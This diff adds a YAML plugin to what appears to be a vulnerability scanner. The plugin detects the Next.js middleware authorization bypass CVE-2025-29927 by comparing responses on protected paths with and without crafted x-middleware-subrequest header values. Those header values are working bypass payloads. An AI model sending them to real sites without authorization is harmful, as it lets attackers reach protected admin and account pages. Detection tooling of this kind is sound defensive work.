@@ -1,0 +1,40 @@
+# SPDX-License-Identifier: AGPL-3.0-only
+# Copyright (C) 2026 Xmar1881 / GASH contributors
+# Module: github.com/Xmar1881/Gash
+#
+# File: plugins/nextjs-middleware-bypass/nextjs-middleware-bypass.yaml
+# What: Tier 1 differential screen for the Next.js middleware authorization
+#   bypass CVE-2025-29927 (GASH-069, CWE-288).
+# Why: The bypass is only provable by comparison: the control request must be
+#   access-denied (401/403 or a login redirect) and the request carrying
+#   x-middleware-subrequest must return materially different 2xx content.
+#   Header echo, unchanged redirects, WAF pages, and public routes never
+#   produce a finding. Requests are GET-only and bounded per path.
+
+id: nextjs-middleware-bypass
+name: Next.js Middleware Authorization Bypass
+description: Detects CVE-2025-29927 Next.js middleware authorization bypass with a control-vs-bypass differential probe on protected paths.
+author: GASH contributors
+severity: high
+tags: [nextjs, middleware, authorization, bypass, cve-2025-29927]
+safe: false
+deep: false
+active: true
+requires_auth: false
+max_requests: 30
+phase: probe
+order: 92
+api_version: "1.0"
+tests: tests/fixtures/nextjs-middleware-bypass/
+request:
+  method: GET
+  paths: ["/admin", "/dashboard", "/api/user", "/account", "/settings"]
+oracle:
+  name: middleware-bypass
+  params:
+    header: x-middleware-subrequest
+    header_values:
+      - "middleware"
+      - "middleware:middleware:middleware:middleware:middleware"
+      - "pages/_middleware"
+      - "src/middleware"
